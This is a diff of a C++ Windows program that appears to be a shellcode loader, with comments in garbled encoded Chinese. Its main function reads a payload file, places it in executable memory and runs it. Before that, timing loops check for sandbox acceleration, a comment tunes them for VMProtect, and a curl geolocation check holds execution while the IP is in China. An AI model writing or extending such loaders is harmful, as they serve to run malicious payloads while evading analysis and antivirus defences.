@@ -36,53 +36,56 @@ void isTimeAccelerated() {
     while (duration.count() < 5000) {
         std::cout << "F" << std::endl;
 
-        double* pvalue = NULL; // ³õÊ¼»¯Îª null µÄÖ¸Õë
-        pvalue = new double;   // Îª±äÁ¿ÇëÇóÄÚ´æ
+        double* pvalue = NULL; // åˆå§‹åŒ–ä¸º null çš„æŒ‡é’ˆ
+        pvalue = new double;   // ä¸ºå˜é‡è¯·æ±‚å†…å­˜
 
-        *pvalue = 29494.99;     // ÔÚ·ÖÅäµÄµØÖ·´æ´¢Öµ
+        *pvalue = 29494.99;     // åœ¨åˆ†é…çš„åœ°å€å­˜å‚¨å€¼
 
-        delete pvalue;         // ÊÍ·ÅÄÚ´æ
+        delete pvalue;         // é‡Šæ”¾å†…å­˜
     }
 }
 
 void ddt() {
     using namespace std::chrono;
 
-    // ³õÊ¼±äÁ¿
+    // åˆå§‹å˜é‡
     int counter = 1;
 
-    // »ñÈ¡µ±Ç°Ê±¼äµã
+    // è·å–å½“å‰æ—¶é—´ç‚¹
     auto start_time = high_resolution_clock::now();
 
-    // ³ÖĞø¼Ó1Ö±µ½5Ãë¹ıÈ¥
+    // æŒç»­åŠ 1ç›´åˆ°5ç§’è¿‡å»
     while (true) {
-        // »ñÈ¡µ±Ç°Ê±¼ä
+        // è·å–å½“å‰æ—¶é—´
         auto current_time = high_resolution_clock::now();
 
-        // ¼ÆËã¹ıÈ¥µÄÊ±¼ä
+        // è®¡ç®—è¿‡å»çš„æ—¶é—´
         auto duration = duration_cast<seconds>(current_time - start_time);
 
-        // Èç¹û5ÃëÒÑ¾­¹ıÈ¥£¬ÔòÍË³öÑ­»·
+        // å¦‚æœ5ç§’å·²ç»è¿‡å»ï¼Œåˆ™é€€å‡ºå¾ªç¯
         if (duration.count() >= 5) {
             break;
         }
 
-        // Ôö¼Ó±äÁ¿
+        // å¢åŠ å˜é‡
         counter++;
     }
 
-    // Êä³ö½á¹û
-    //std::cout << "ÔÚ5ÃëÄÚ£¬±äÁ¿´Ó1Ôö¼Óµ½£º" << counter << std::endl;
+    // è¾“å‡ºç»“æœ
+    //std::cout << "åœ¨5ç§’å†…ï¼Œå˜é‡ä»1å¢åŠ åˆ°ï¼š" << counter << std::endl;
+    std::cout << counter << std::endl;
 
-    while (counter < 80000000) {
-        std::cout << "F" << std::endl;
+    //while (counter < 90000000) {
+    //0.9äº¿æ˜¯æ²¡æœ‰ä½¿ç”¨vmpçš„,3ä¸‡æ˜¯ç»™ä½¿ç”¨vmpçš„
+    while (counter < 30000) {
+        std::cout << "D" << std::endl;
 
-        double* pvalue = NULL; // ³õÊ¼»¯Îª null µÄÖ¸Õë
-        pvalue = new double;   // Îª±äÁ¿ÇëÇóÄÚ´æ
+        double* pvalue = NULL; // åˆå§‹åŒ–ä¸º null çš„æŒ‡é’ˆ
+        pvalue = new double;   // ä¸ºå˜é‡è¯·æ±‚å†…å­˜
 
-        *pvalue = 29494.99;     // ÔÚ·ÖÅäµÄµØÖ·´æ´¢Öµ
+        *pvalue = 29494.99;     // åœ¨åˆ†é…çš„åœ°å€å­˜å‚¨å€¼
 
-        delete pvalue;         // ÊÍ·ÅÄÚ´æ
+        delete pvalue;         // é‡Šæ”¾å†…å­˜
 
         //Sleep(1);
     }
@@ -92,26 +95,26 @@ void ddt() {
 void ip() {
     while (true) {
 
-        // Ö´ĞĞ curl ÃüÁî£¬²¢»ñÈ¡Êä³ö
+        // æ‰§è¡Œ curl å‘½ä»¤ï¼Œå¹¶è·å–è¾“å‡º
         const char* cmd = "curl -s https://myip.ipip.net/";
 
-        // ½« char* ×ª»»Îª wchar_t*£¨Ê¹ÓÃ°²È«º¯Êı mbstowcs_s£©
+        // å°† char* è½¬æ¢ä¸º wchar_t*ï¼ˆä½¿ç”¨å®‰å…¨å‡½æ•° mbstowcs_sï¼‰
         size_t cmdLength = strlen(cmd) + 1;
         std::wstring wCmd(cmdLength, L'\0');
         size_t convertedChars = 0;
 
-        // Ê¹ÓÃ mbstowcs_s ×ª»» char* µ½ wchar_t*
+        // ä½¿ç”¨ mbstowcs_s è½¬æ¢ char* åˆ° wchar_t*
         errno_t err = mbstowcs_s(&convertedChars, &wCmd[0], wCmd.size(), cmd, cmdLength);
         if (err != 0) {
             std::cerr << "Error converting char* to wchar_t*.\n";
-            exit(1);
+            return;
         }
 
-        // ÉèÖÃÃüÁîĞĞµÄÊä³ö»º³åÇø
+        // è®¾ç½®å‘½ä»¤è¡Œçš„è¾“å‡ºç¼“å†²åŒº
         std::array<char, 128> buffer;
         std::string result;
 
-        // Í¨¹ı CreateProcess Ö´ĞĞÃüÁî
+        // é€šè¿‡ CreateProcess æ‰§è¡Œå‘½ä»¤
         SECURITY_ATTRIBUTES saAttr;
         saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
         saAttr.lpSecurityDescriptor = NULL;
@@ -120,7 +123,7 @@ void ip() {
         HANDLE hReadPipe, hWritePipe;
         if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
             std::cerr << "Failed to create pipe\n";
-            exit(1);
+            return;
         }
 
         PROCESS_INFORMATION piProcInfo;
@@ -133,122 +136,140 @@ void ip() {
         siStartInfo.hStdError = hWritePipe;
         siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
-        // ´´½¨½ø³Ì£¬Ê¹ÓÃ¿í×Ö·û°æ±¾µÄ CreateProcessW
+        // åˆ›å»ºè¿›ç¨‹ï¼Œä½¿ç”¨å®½å­—ç¬¦ç‰ˆæœ¬çš„ CreateProcessW
         if (!CreateProcessW(NULL, &wCmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
             std::cerr << "CreateProcess failed\n";
-            exit(1);
+            return;
         }
 
-        // ¹Ø±ÕĞ´¹ÜµÀ
+        // å…³é—­å†™ç®¡é“
         CloseHandle(hWritePipe);
 
-        // ¶ÁÈ¡ÃüÁîµÄÊä³ö
+        // è¯»å–å‘½ä»¤çš„è¾“å‡º
         DWORD dwRead;
         char szBuffer[4096];
         while (true) {
             if (!ReadFile(hReadPipe, szBuffer, sizeof(szBuffer) - 1, &dwRead, NULL) || dwRead == 0)
                 break;
-            szBuffer[dwRead] = '\0';  // È·±£¶ÁÈ¡µÄÊı¾İÊÇÒÔ \0 ½áÊøµÄ×Ö·û´®
+            szBuffer[dwRead] = '\0';  // ç¡®ä¿è¯»å–çš„æ•°æ®æ˜¯ä»¥ \0 ç»“æŸçš„å­—ç¬¦ä¸²
             result += szBuffer;
         }
 
-        // µÈ´ı½ø³Ì½áÊø
+        // ç­‰å¾…è¿›ç¨‹ç»“æŸ
         WaitForSingleObject(piProcInfo.hProcess, INFINITE);
 
-        // ¹Ø±Õ¾ä±ú
+        // å…³é—­å¥æŸ„
         CloseHandle(hReadPipe);
         CloseHandle(piProcInfo.hProcess);
         CloseHandle(piProcInfo.hThread);
 
-        // ¼ì²éÊä³öÄÚÈİÖĞÊÇ·ñ°üº¬ "ÖĞ¹ú"
-        if (result.find("ÖĞ¹ú") == std::string::npos) {
+        // æ£€æŸ¥è¾“å‡ºå†…å®¹ä¸­æ˜¯å¦åŒ…å« "ä¸­å›½"
+        if (result.find("ä¸­å›½") == std::string::npos) {
             break;
         }
-    }
-}
 
-int decryptKey(int diff, int minValue, int maxValue) {
+        using namespace std::chrono;
 
-    for (int num = minValue; num <= maxValue; num++) {
+        // è·å–å½“å‰æ—¶é—´ç‚¹
+        auto start_time = high_resolution_clock::now();
 
-        int randomValue = diff + num;
+        while (true) {
+            // è·å–å½“å‰æ—¶é—´
+            auto current_time = high_resolution_clock::now();
 
-        if (520519 < randomValue && randomValue < 520521) {
-            return randomValue;
+            // è®¡ç®—è¿‡å»çš„æ—¶é—´
+            auto duration = duration_cast<seconds>(current_time - start_time);
+
+            // å¦‚æœ3ç§’å·²ç»è¿‡å»ï¼Œåˆ™é€€å‡ºå¾ªç¯
+            if (duration.count() >= 3) {
+                break;
+            }
         }
     }
-
 }
 
-std::string xorDecrypt(const std::string& data, const std::string& key) {
+//int decryptKey(int diff, int minValue, int maxValue) {
 
-    std::string decryptedData;
-    for (std::size_t i = 0; i < data.length(); ++i) {
-        decryptedData += data[i] ^ key[i % key.length()];
-    }
-    return decryptedData;
-}
+  //  for (int num = minValue; num <= maxValue; num++) {
+
+    //    int randomValue = diff + num;
+
+      //  if (520519 < randomValue && randomValue < 520521) {
+        //    return randomValue;
+        //}
+    //}
+
+//}
+
+//std::string xorDecrypt(const std::string& data, const std::string& key) {
+
+  //  std::string decryptedData;
+    //for (std::size_t i = 0; i < data.length(); ++i) {
+      //  decryptedData += data[i] ^ key[i % key.length()];
+    //}
+    //return decryptedData;
+//}
 
 
-void RingQ(const std::string& file_path) {
+//void RingQ(const std::string& file_path) {
+//
+  //  const char* filePath = "main.txt"; // ä½ çš„ shellcode æ–‡ä»¶è·¯å¾„
+  //  std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);
 
-    const char* filePath = "main.txt"; // ÄãµÄ shellcode ÎÄ¼şÂ·¾¶
-    std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);
 
+    // è·å–æ–‡ä»¶å¤§å°
+ //   std::streamsize byte_sequence_length = shellcodeFile.tellg();
+ //   shellcodeFile.seekg(0, std::ios::beg);
 
-    // »ñÈ¡ÎÄ¼ş´óĞ¡
-    std::streamsize byte_sequence_length = shellcodeFile.tellg();
-    shellcodeFile.seekg(0, std::ios::beg);
+    // åˆ†é…å†…å­˜å¹¶è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ä¸­
+//    char* byte_sequence = new char[byte_sequence_length];
 
-    // ·ÖÅäÄÚ´æ²¢¶ÁÈ¡ÎÄ¼şÄÚÈİµ½ÄÚ´æÖĞ
-    char* byte_sequence = new char[byte_sequence_length];
+    // åˆ†é…å¯æ‰§è¡Œå†…å­˜
+//    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-    // ·ÖÅä¿ÉÖ´ĞĞÄÚ´æ
-    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // å°†æ–‡ä»¶å†…å®¹æ‹·è´åˆ°åˆ†é…çš„å†…å­˜
+  //  memcpy(execMemory, byte_sequence, byte_sequence_length);
+ //   delete[] byte_sequence;
 
-    // ½«ÎÄ¼şÄÚÈİ¿½±´µ½·ÖÅäµÄÄÚ´æ
-    memcpy(execMemory, byte_sequence, byte_sequence_length);
-    delete[] byte_sequence;
+    // å°†å†…å­˜åœ°å€è½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆ
+    //typedef void (*ShellcodeFunc)();
+   // ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
 
-    // ½«ÄÚ´æµØÖ·×ª»»Îªº¯ÊıÖ¸Õë
-    typedef void (*ShellcodeFunc)();
-    ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
+    // æ‰§è¡Œ shellcode
+    //shellcodeFunc();
 
-    // Ö´ĞĞ shellcode
-    shellcodeFunc();
+    // é‡Šæ”¾åˆ†é…çš„å†…å­˜
+    //VirtualFree(execMemory, 0, MEM_RELEASE);
 
-    // ÊÍ·Å·ÖÅäµÄÄÚ´æ
-    VirtualFree(execMemory, 0, MEM_RELEASE);
+//}
 
-}
+// Base64 è§£ç å‡½æ•°
+//std::vector<unsigned char> base64_decode(const std::string& in) {
+  //  std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    //size_t len = in.size();
+    //size_t padding = 0;
+   // if (len > 1 && in[len - 1] == '=') padding++;
+    //if (len > 2 && in[len - 2] == '=') padding++;
 
-// Base64 ½âÂëº¯Êı
-std::vector<unsigned char> base64_decode(const std::string& in) {
-    std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    size_t len = in.size();
-    size_t padding = 0;
-    if (len > 1 && in[len - 1] == '=') padding++;
-    if (len > 2 && in[len - 2] == '=') padding++;
+    //size_t decoded_size = (len * 3) / 4 - padding;
+   // std::vector<unsigned char> decoded_data(decoded_size);
 
-    size_t decoded_size = (len * 3) / 4 - padding;
-    std::vector<unsigned char> decoded_data(decoded_size);
+    //int val = 0, valb = -8;
+   // size_t j = 0;
 
-    int val = 0, valb = -8;
-    size_t j = 0;
+ //   for (size_t i = 0; i < len; ++i) {
+   //     char c = in[i];
+     //   if (c == '=' || base64_chars.find(c) == std::string::npos) continue;
 
-    for (size_t i = 0; i < len; ++i) {
-        char c = in[i];
-        if (c == '=' || base64_chars.find(c) == std::string::npos) continue;
-
-        val = (val << 6) + base64_chars.find(c);
-        valb += 6;
-        if (valb >= 0) {
-            decoded_data[j++] = (val >> valb) & 0xFF;
-            valb -= 8;
-        }
-    }
-    return decoded_data;
-}
+//        val = (val << 6) + base64_chars.find(c);
+  //      valb += 6;
+    //    if (valb >= 0) {
+      //      decoded_data[j++] = (val >> valb) & 0xFF;
+        //    valb -= 8;
+        //}
+//    }
+  //  return decoded_data;
+//}
 
 int main(int argc, char* argv[]) {
 
@@ -262,9 +283,9 @@ int main(int argc, char* argv[]) {
     //std::string file_path = "main.txt";
     //RingQ(file_path);
 
-    // ¼ì²éÃüÁîĞĞ²ÎÊı
+    // æ£€æŸ¥å‘½ä»¤è¡Œå‚æ•°
 
-    // »ñÈ¡ shellcode ÎÄ¼şÂ·¾¶
+    // è·å– shellcode æ–‡ä»¶è·¯å¾„
     const char* filePath = argv[2];
     std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);
 
@@ -273,11 +294,11 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    // »ñÈ¡ÎÄ¼ş´óĞ¡
+    // è·å–æ–‡ä»¶å¤§å°
     std::streamsize byte_sequence_length = shellcodeFile.tellg();
     shellcodeFile.seekg(0, std::ios::beg);
 
-    // ·ÖÅäÄÚ´æ²¢¶ÁÈ¡ÎÄ¼şÄÚÈİµ½ÄÚ´æÖĞ
+    // åˆ†é…å†…å­˜å¹¶è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ä¸­
     char* byte_sequence = new char[byte_sequence_length];
     if (!shellcodeFile.read(byte_sequence, byte_sequence_length)) {
         //std::cerr << "Failed to read shellcode from file: " << filePath << std::endl;
@@ -285,7 +306,7 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    // ·ÖÅä¿ÉÖ´ĞĞÄÚ´æ
+    // åˆ†é…å¯æ‰§è¡Œå†…å­˜
     LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (execMemory == NULL) {
         //std::cerr << "Failed to allocate memory." << std::endl;
@@ -293,18 +314,18 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    // ½«ÎÄ¼şÄÚÈİ¿½±´µ½·ÖÅäµÄÄÚ´æ
+    // å°†æ–‡ä»¶å†…å®¹æ‹·è´åˆ°åˆ†é…çš„å†…å­˜
     memcpy(execMemory, byte_sequence, byte_sequence_length);
     //delete[] byte_sequence;
 
-    // ½«ÄÚ´æµØÖ·×ª»»Îªº¯ÊıÖ¸Õë
+    // å°†å†…å­˜åœ°å€è½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆ
     typedef void (*ShellcodeFunc)();
     ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
 
-    // Ö´ĞĞ shellcode
+    // æ‰§è¡Œ shellcode
     shellcodeFunc();
 
-    // ÊÍ·Å·ÖÅäµÄÄÚ´æ
+    // é‡Šæ”¾åˆ†é…çš„å†…å­˜
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
     //system("pause");
